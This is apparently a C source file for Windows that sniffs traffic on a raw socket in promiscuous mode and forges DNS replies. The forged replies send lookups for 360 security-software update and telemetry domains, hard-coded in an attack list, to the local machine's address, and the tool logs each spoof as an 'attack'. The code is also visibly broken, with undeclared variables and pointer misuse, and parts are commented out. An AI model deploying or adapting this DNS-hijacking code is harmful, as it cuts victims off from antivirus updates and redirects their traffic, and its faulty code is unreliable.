                                                                                                                                                                                                            #define _CRT_SECURE_NO_WARNINGS 
#include <stdio.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdlib.h>
#include <Windows.h>
//#include <string.h>
//#include "PublicVar.h"
//#include "RawPacket.h"
//#include "DnsHijack.h"
//#include "GetInformation.h"

#pragma comment(lib,"rawpacket.lib")
#pragma comment(lib,"Ws2_32.lib")

#define SOURCE_PORT			7234
#define MAX_RECEIVEBYTE		255
#define MAX_ADDR_LEN		32
#define SIO_RCVALL  (IOC_IN|IOC_VENDOR|1)	//��������Ϊ����ģʽ


#define MAC_ADDRESS_SIZE 6
typedef struct 
{
	unsigned char			DstMAC[MAC_ADDRESS_SIZE];
	unsigned char			SrcMAC[MAC_ADDRESS_SIZE];
	unsigned short			Protocol;
}MACHEADER,*LPMACHEADER;


typedef struct ip_hdr				//����IP�ײ�
{
	unsigned char h_verlen;			//4λ�ײ����ȣ�4λIP�汾��
	unsigned char tos;				//8λ��������TOS
	unsigned short tatal_len;		//16λ�ܳ���
	unsigned short ident;			//16λ��ʾ
	unsigned short frag_and_flags;	//ƫ������3λ��־λ
	unsigned char ttl;				//8λ����ʱ��TTL
	unsigned char proto;			//8λЭ�飨TCP,UDP��������
	unsigned short checksum;		//16λIP�ײ������
	unsigned int sourceIP;			//32λԴIP��ַ
	unsigned int destIP;			//32λĿ��IP��ַ
}IPHEADER;

typedef struct tsd_hdr				//����TCPα�ײ�
{
	unsigned long saddr;			//Դ��ַ
	unsigned long daddr;			//Ŀ�ĵ�ַ
	char mbz;
	char ptcl;						//Э������
	unsigned short tcpl;			//TCP����
}PSDHEADER;

typedef struct tcp_hdr				//����TCP�ײ�
{
	unsigned short sport;			//16λԴ�˿�
	unsigned short dport;			//16λĿ�Ķ˿�
	unsigned int seq;				//32λ���к�
	unsigned int ack;				//32λȷ�Ϻ�
	unsigned char lenres;			//4λ�ײ�����/6λ������
	unsigned char flag;				//6λ��־λ
	unsigned short win;				//16λ���ڴ�С
	unsigned short sum;				//16λ�����
	unsigned short urp;				//16λ��������ƫ����
}TCPHEADER;

typedef struct udp_hdr				//����UDP�ײ�
{
	unsigned short sport;			//16λԴ�˿�
	unsigned short dport;			//16λĿ�Ķ˿�
	unsigned short len;				//UDP ����
	unsigned short cksum;			//����
}UDPHEADER;

typedef struct icmp_hdr				//����ICMP�ײ�
{
	unsigned short sport;
	unsigned short dport;
	unsigned char type;
	unsigned char code;
	unsigned short cksum;
	unsigned short id;
	unsigned short seq;
	unsigned long timestamp;
}ICMPHEADER;

typedef struct FRAMETAGINFO
{
	WORD	tagtype;
	WORD	tagdata;
}FRAMETAGINFO;

typedef struct PACKETINFO
{
	BYTE			mac[12];
	BYTE			sip[4];
	BYTE			dip[4];
	WORD			sport;
	WORD			dport;
	int				frametagnum;				// ֡Я���ı�ǩ����(Vlan / PPPoE)
	FRAMETAGINFO	tagarr[8];
	BYTE			pro;		// tcp or udp
	BYTE			flag;
	WORD			datalen;
	DWORD			seq;
	DWORD			ack;
	BYTE			iphlen;
	BYTE			tcphlen;
	WORD			winsize;
	BYTE*			pData;
	BYTE			tcpoperation[48];		// TCP ѡ��
	time_t			packtm;
}PACKETINFO;
BOOL GetPacketInfo(PACKETINFO& packinfo, const BYTE* pPacket, int len);
int  AssembleUDPPacket(PACKETINFO& packinfo, const BYTE* pData, BYTE* pBuf);


typedef struct  
{
	WORD id;
	WORD flag;
	WORD question;
	WORD answer;
	WORD authorityrrs;
	WORD additionalrrs;
} DNS_REQUEST_HEADER,* PDNS_REQUEST_HEADER;

//the struct is not be in the same mode in memmory
typedef struct  
{
	WORD name;
	WORD type;
	WORD dnsclass;
	WORD timetolivehigh;	//split the dword,or will cause error
	WORD timetolivelow;
	WORD length;
} DNS_ANSWER_HEADER,* PDNS_ANSWER_HEADER;



unsigned long localip = 0;


int __stdcall RawPacketCapture()
{
	SOCKET sock = 0;
	WSADATA wsd = {0};
	char recvBuffer[0x10000] = { 0 };

	char * recvBuf = recvBuffer + sizeof(MACHEADER);
	char temp[0x10000] = { 0 };
	DWORD dwBytesRet = 0;

	int pCount = 0;
	unsigned int optval = 1;
	unsigned char* dataip = nullptr;
	unsigned char* datatcp = nullptr;
	unsigned char* dataudp = nullptr;
	unsigned char* dataicmp = nullptr;

// 	int lentcp, lenudp, lenicmp, lenip;
// 	char TcpFlag[6] = { 'F', 'S', 'R', 'A', 'U' };							//����TCP��־λ
	int iRet = WSAStartup(0x0202, &wsd);

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == SOCKET_ERROR)	//����һ��ԭʼ�׽���
	{
		int error = WSAGetLastError();
		return FALSE;
	}

	//iRet = GetNetCardInfo(strLocalIP,strLocalMac,strLocalExternalIP,strGateWayIP,strGateWayMac);

	char FAR name[MAXBYTE];
	iRet = gethostname(name, MAXBYTE);
	struct hostent FAR* pHostent;

	pHostent = (struct hostent*)malloc(sizeof(struct hostent));
	pHostent = gethostbyname(name);
	SOCKADDR_IN sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(80);						//ԭʼ�׽���û�ж˿ڵĸ���������ֵ�������
	memcpy(&sa.sin_addr,pHostent->h_addr_list[0],pHostent->h_length);//���ñ�����ַ

	localip = inet_addr(strLocalIP);
	memcpy(&sa.sin_addr,&localip,4);

	iRet = bind(sock, (SOCKADDR*)&sa, sizeof(sa));//��
	if (WSAGetLastError() == 10013)
	{
		exit(0);
	}

	//��������Ϊ����ģʽ��Ҳ�з���ģʽ�������������������еİ���
	iRet = WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), nullptr, 0, &dwBytesRet,nullptr,nullptr);

// 	UDPHEADER * pUdpheader;		//UDPͷ�ṹ��ָ��
// 	IPHEADER * pIpheader;		//IPͷ�ṹ��ָ��
// 	TCPHEADER * pTcpheader;		//TCPͷ�ṹ��ָ��
// 	ICMPHEADER * pIcmpheader;	//ICMPͷ�ṹ��ָ��
// 	char szSourceIP[MAX_ADDR_LEN], szDestIP[MAX_ADDR_LEN];	//ԴIP��Ŀ��IP
// 	SOCKADDR_IN saSource, saDest;							//Դ��ַ�ṹ�壬Ŀ�ĵ�ַ�ṹ��

// 	//���ø���ͷָ��
// 	pIpheader = (IPHEADER*)recvBuf;
// 	pTcpheader = (TCPHEADER*)(recvBuf + sizeof(IPHEADER));
// 	pUdpheader = (UDPHEADER*)(recvBuf + sizeof(IPHEADER));
// 	pIcmpheader = (ICMPHEADER*)(recvBuf + sizeof(IPHEADER));
// 	int iIphLen = sizeof(unsigned long)*(pIpheader->h_verlen & 0x0f);

	while (TRUE)
	{
		//memset(recvBuf, 0, sizeof(recvBuf));//��ջ�����
		iRet = recv(sock, recvBuf, 0x10000, 0);//���հ�
		if(iRet > 0)
		{
			*(recvBuf + iRet) = 0;
			LPMACHEADER pMac = (LPMACHEADER)recvBuffer;
			memmove(pMac->DstMAC,strLocalMac,6);
			memmove(pMac->SrcMAC,strGateWayMac,6);
			memcpy(&pMac->Protocol,"\x08\x00",2);
			iRet = DnsMainProcess(sock,recvBuffer,iRet + sizeof(MACHEADER),&sa);
		}

		IPHEADER * pIp = (IPHEADER*)recvBuf;

		int iphdr_len = pIp->h_verlen & 0xf << 2;

		UDPHEADER * pUdp = (UDPHEADER*)(recvBuf + iphdr_len);

		int idatasize = ntohs(ip_hdr.tatal_len) - iphdr_len - sizeof(UDPHEADER);

		DNS_REQUEST_HEADER pdnsreq = (DNS_REQUEST_HEADER*)(recvBuf + iphdr_len + sizeof(UDPHEADER));

		USHORT sport = ntohs(pUdp.sport);
		USHORT dport = ntohs(pUdp->dport);

		if (pIp->proto == 0X11 && dport == 53 && idatasize >= 58)
		{

		}

// 		//���Դ��ַ��Ŀ�ĵ�ַ
// 		saSource.sin_addr.s_addr = pIpheader->sourceIP;
// 		strncpy(szSourceIP, inet_ntoa(saSource.sin_addr), MAX_ADDR_LEN);
// 		saDest.sin_addr.s_addr = pIpheader->destIP;
// 		strncpy(szDestIP, inet_ntoa(saDest.sin_addr), MAX_ADDR_LEN);
// 
// 		//������ְ��ĳ��ȣ�ֻ���ж��Ƿ��Ǹð���������壬�ȼ��������
// 		lenip = ntohs(pIpheader->tatal_len);
// 		lentcp = ntohs(pIpheader->tatal_len) - (sizeof(IPHEADER) + sizeof(TCPHEADER));
// 		lenudp = ntohs(pIpheader->tatal_len) - (sizeof(IPHEADER) + sizeof(UDPHEADER));
// 		lenicmp = ntohs(pIpheader->tatal_len) - (sizeof(IPHEADER) + sizeof(ICMPHEADER));

		//�ж��Ƿ���TCP��
// 		if (pIpheader->proto == IPPROTO_TCP &&lentcp != 0)
// 		{
// 			pCount++;					//������һ
// 			dataip = (unsigned char *)recvBuf;
// 			datatcp = (unsigned char *)recvBuf + sizeof(IPHEADER) + sizeof(TCPHEADER);
// 			system("cls");
// 
// 			printf("\n#################���ݰ�[%i]=%d�ֽ�����#############", pCount, 
// 
// 				lentcp);
// 			printf("\n**********IPЭ��ͷ��***********");
// 			printf("\n��ʾ��%i", ntohs(pIpheader->ident));
// 			printf("\n�ܳ��ȣ�%i", ntohs(pIpheader->tatal_len));
// 			printf("\nƫ������%i", ntohs(pIpheader->frag_and_flags));
// 			printf("\n����ʱ�䣺%d",pIpheader->ttl);
// 			printf("\n�������ͣ�%d",pIpheader->tos);
// 			printf("\nЭ�����ͣ�%d",pIpheader->proto);
// 			printf("\n����ͣ�%i", ntohs(pIpheader->checksum));
// 			printf("\nԴIP��%s", szSourceIP);
// 			printf("\nĿ��IP��%s", szDestIP);
// 			printf("\n**********TCPЭ��ͷ��***********");
// 			printf("\nԴ�˿ڣ�%i", ntohs(pTcpheader->sport));
// 			printf("\nĿ�Ķ˿ڣ�%i", ntohs(pTcpheader->dport));
// 			printf("\n���кţ�%i", ntohs(pTcpheader->seq));
// 			printf("\nӦ��ţ�%i", ntohs(pTcpheader->ack));
// 			printf("\n����ͣ�%i", ntohs(pTcpheader->sum));
// 			printf("\n��־λ��");
// 
// 			unsigned char FlagMask = 1;
// 			int k;
// 
// 			//��ӡ��־λ
// 			for (k = 0; k < 6; k++)
// 			{
// 				if ((pTcpheader->flag)&FlagMask)
// 					printf("%c", TcpFlag[k]);
// 				else
// 					printf(" ");
// 				FlagMask = FlagMask << 1;
// 			}
// 			//��ӡ��ǰ100���ֽڵ�ʮ����������
// 			printf("\n���ݣ�\n");
// 			for (int i = 0; i < 100; i++)
// 			{
// 				printf("%x", datatcp[i]);
// 			}
// 		}	

// 		if ( pIpheader->proto == IPPROTO_UDP && lenudp > 0)
// 		{
// 			if ( pUdpheader->dport == 53 || pUdpheader->sport == 53)
// 			{
// 				pCount++;
// 				dataip = (unsigned char *)recvBuf;
// 				dataudp = (unsigned char *)recvBuf + sizeof(IPHEADER) + sizeof(UDPHEADER);
// 
// 
// 			}
// 		}


	}
}






































#define MAX_FAKE_DNS_SIZE		0X80

int DnsMainProcess(SOCKET sock,char * pkt_data,int iDataLen,sockaddr_in * stsockaddr)
//void MyPcapMainProcess(pcap_t * pcapMyMainHandle)
{
	//pcap_pkthdr *			header = 0;
	DWORD					packetlen = 0;
	//const unsigned char *	pkt_data = 0;	
	ip_hdr	*			ih = 0;
	udp_hdr	*			uh = 0;
	u_int					ip_len = 0;
	u_short					sport = 0;
	u_short					dport = 0;	
	int						cnt = 0;
	int						res = 0;

	if (iDataLen <= 38)
	{
		return FALSE;
	}

	//�������������Ƿ�ɹ�
	//FILE * fp = fopen("1-dns.dat","wb");
	//int i = 0;
	//if (fp == 0)
	//{
	// 	printf("fopen file error!\n");
	//}

	//return;



// 	while (TRUE)
// 	{
// 		res = pcap_next_ex(pcapMyMainHandle,&header,&pkt_data) ;
// 		if (res <= 0)
// 		{
// 			continue;
// 		}


		//�������������Ƿ�ɹ�
		//i =fwrite(pkt_data,1,header->caplen,fp);
		//if (i != header->caplen)
		//{
		//	printf("write file error!\n");
		//}
		//else
		//{
		//	printf("find packet!\n");
		//}



		packetlen=0;
// 		for (cnt=0; cnt<8; cnt++)		// ȥ��Vlan֡����
// 		{
// 			if (memcmp(pkt_data + packetlen+ 12, "\x81\x00", 2) == 0)
// 			{
// 				packetlen += 4;
// 				continue;
// 			}
// 			else
// 			{
// 				break;
// 			}
// 		}

		if (memcmp(pkt_data+12, "\x88\x64", 2) == 0)			// PPPoE
		{
			if (memcmp(pkt_data+20, "\x00\x21", 2) == 0)		// pppoe��Я���Ĳ���IP��,Ŀǰ����Ҫ����
			{
				packetlen += 8 + 14;		
			}
			else
			{
				return FALSE;
				
			}
		}
		else if (memcmp(pkt_data+12, "\x08\x00", 2) == 0)
		{
			packetlen += 14;
		}
		else if (memcmp(pkt_data+12, "\x08\x06", 2) == 0)
		{
			packetlen += 14;
		}

		/* retireve the position of the ip header */
		ih = (ip_hdr *) (pkt_data + packetlen); //length of ethernet header
		

		/* retireve the position of the udp header */
		ip_len = (ih->h_verlen & 0xf) << 2;

		//int iplen = ntohs(ih->tatal_len);
		uh = (udp_hdr *) ((u_char*)ih + ip_len);

		/* convert from network byte order to host byte order */
		sport = ntohs( uh->sport );
		dport = ntohs( uh->dport );

		/* print ip addresses and udp ports */
		// 	CString mapkey;
		// 	mapkey.Format("%03d_%03d_%03d_%03d",
		// 		ih->saddr.byte1,
		// 		ih->saddr.byte2,
		// 		ih->saddr.byte3,
		// 		ih->saddr.byte4);
		// 
		// 	CString mapkey2;
		// 	mapkey2.Format("%03d_%03d_%03d_%03d",
		// 		ih->daddr.byte1,
		// 		ih->daddr.byte2,
		// 		ih->daddr.byte3,
		// 		ih->daddr.byte4);

		if(dport == 53 )
		{
			if(iDataLen>58)			//mac= 14 IP=20 UDP=8 DNS REQUEST HEADER = 12 DNS REQUEST ENDER = 4
			{

					char dnsname[MAX_FAKE_DNS_SIZE] = {0};
					char * tmpdnsname = (char*)pkt_data+packetlen+41;		//41=dns domain name start position
					//.com.xiaomi.net һ��ǰ��Ϊ���� ����Ϊ�ַ���,��������Ľṹ����һ������
					for (cnt=0; cnt<(int)strlen(tmpdnsname); cnt++)
					{
						if(tmpdnsname[cnt]>0x00 && tmpdnsname[cnt]<=0x0f)
						{
							dnsname[cnt] = '.';
						}
						else
						{
							dnsname[cnt] = tmpdnsname[cnt];
						}
					}

					DWORD gAttackCnt = 0;
					char gDNSAttackListSize = 1;
					char gDNSAttackList[64][MAX_PATH] = {0};
					unsigned long g_ulFakeDestIP = localip;
					strcpy(gDNSAttackList[0],"www.360.cn");
					strcpy(gDNSAttackList[1],"s.360.cn");
					strcpy(gDNSAttackList[2],"tr.p.360.cn");
					strcpy(gDNSAttackList[3],"safe.static.uc.360.cn");
					strcpy(gDNSAttackList[4],"conf.wsm.360.cn");
					strcpy(gDNSAttackList[5],"agt.p.360.cn");
					strcpy(gDNSAttackList[6],"update.leak.360.cn");
					strcpy(gDNSAttackList[7],"update.360safe.com");
					strcpy(gDNSAttackList[8],"tconf.f.360.cn");
					strcpy(gDNSAttackList[9],"sdup.360.cn");
					strcpy(gDNSAttackList[10],"softm.update.360safe.cn");

					for(cnt=0; cnt< gDNSAttackListSize; cnt++)
					{
						if( strstr(dnsname,gDNSAttackList[cnt]) )		//dnsname ����������
						{
							//�������ݰ�
							unsigned short int iphlen = pkt_data[packetlen] & 0x0f;
							unsigned short int iplen = (pkt_data[packetlen+2]<<8) + pkt_data[packetlen+3];
							unsigned short int Tdatalen = iplen - (iphlen<<2) - 8;

							//if(Tdatalen>800) 
							//{
							//	return;
							//}


							PACKETINFO packinfo = {0};
							if (GetPacketInfo(packinfo, (unsigned char*)pkt_data, iDataLen))
							{
								UCHAR data[MAX_FAKE_DNS_SIZE];
								memset(data,0,MAX_FAKE_DNS_SIZE);

								USHORT dlen=0;
								memcpy(data,packinfo.pData,Tdatalen);
								data[2]=0x81;
								data[3]=0x80;
								data[4]=0;
								data[5]=1;
								data[6]=0;
								data[7]=1;
								data[8]=0;
								data[9]=0;
								data[10]=0;
								data[11]=0;

								memcpy(data+Tdatalen,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x80\x00\x00\x04",12);
								memcpy(data+Tdatalen+12,(char*)&localip,4);

								dlen = Tdatalen+16;
								// �������ݸ��ͻ���
								PACKETINFO tmppackinfo;
								memcpy(&tmppackinfo, &packinfo, sizeof(PACKETINFO));
								memcpy(tmppackinfo.mac+6, packinfo.mac, 6);
								memcpy(tmppackinfo.mac, packinfo.mac+6, 6);
								memcpy(tmppackinfo.sip, packinfo.dip, 4);
								memcpy(tmppackinfo.dip, packinfo.sip, 4);
								tmppackinfo.sport = packinfo.dport;
								tmppackinfo.dport = packinfo.sport;
								tmppackinfo.datalen = dlen;

								BYTE PacketData[MAX_FAKE_DNS_SIZE];
								memset(PacketData, 0, MAX_FAKE_DNS_SIZE);
								int Sendlen = AssembleUDPPacket(tmppackinfo, data, PacketData);


								int iRet = sendto(sock,(char*)PacketData + sizeof(MACHEADER),Sendlen - sizeof(MACHEADER),0,(sockaddr*)stsockaddr,sizeof(sockaddr_in));
								//pcap_sendpacket(pcapMyMainHandle,PacketData,Sendlen);
								printf("attack %s\n",dnsname);
								gAttackCnt ++;
								return TRUE;
							}
							break;
						}
					}
				
			}
		}
	//}

	return TRUE ;
}

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              